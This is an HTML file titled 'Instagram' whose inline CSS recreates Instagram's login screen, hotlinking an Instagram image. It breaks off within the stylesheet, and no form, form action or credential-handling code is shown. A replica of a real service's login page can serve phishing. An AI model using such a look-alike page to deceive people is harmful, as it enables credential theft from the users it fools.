<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>📷</text></svg>">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .container {
      max-width: 935px;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      gap: 32px;
    }

    /* Phone mockup */
    .phone-mockup {
      display: none;
      flex-shrink: 0;
    }

    @media (min-width: 876px) {
      .phone-mockup {
        display: block;
        width: 454px;
        height: 618px;
        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="454" height="618"><rect width="454" height="618" rx="30" fill="none" stroke="%23dbdbdb" stroke-width="2"/><rect x="10" y="10" width="434" height="598" rx="25" fill="%23fafafa"/><text x="227" y="300" text-anchor="middle" font-size="14" fill="%23999">📱 Instagram Preview</text></svg>') no-repeat;
        position: relative;
      }
      .phone-mockup::after {
        content: '';
        position: absolute;
        top: 100px;
        left: 63px;
        width: 328px;
        height: 440px;
        background: url('https://www.instagram.com/static/images/homepage/screenshot1.jpg/2c9a3e2a5a8c.jpg') no-repeat center/cover;
        border-radius: 4px;
      }
    }

    /* Login card */
    .login-card {
      max-width: 350px;
      width: 100%;
    }

    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 20px;
      margin-bottom: 10px;
    }

    .logo {
      text-align: center;
      margin-bottom: 32px;
    }

    .logo svg {
      width: 175px;
      height: 51px;
    }

    .form-group {
      margin-bottom: 6px;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
    }

    .input-wrapper input {
      width: 100%;
      padding: 9px 0 7px 8px;
      height: 38px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      outline: none;
      transition: border-color 0.1s;
    }

    .input-wrapper input:focus {
      border-color: #a8a8a8;
    }

    .input-wrapper input::placeholder {
      color: #8e8e8e;
      font-size: 12px;
    }

    .input-wrapper label {
      position: absolute;
      left: 8px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 12px;
      color: #8e8e8e;
      pointer-events: none;
      transition: all 0.1s ease;
      display: none;
    }

    .btn-login {
      width: 100%;
      padding: 7px 16px;
      background-color: #0095f6;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      margin-top: 8px;
      opacity: 0.7;
      transition: opacity 0.1s;
    }

    .btn-login.active {
      opacity: 1;
    }

    .btn-login:hover {
      background-color: #1877f2
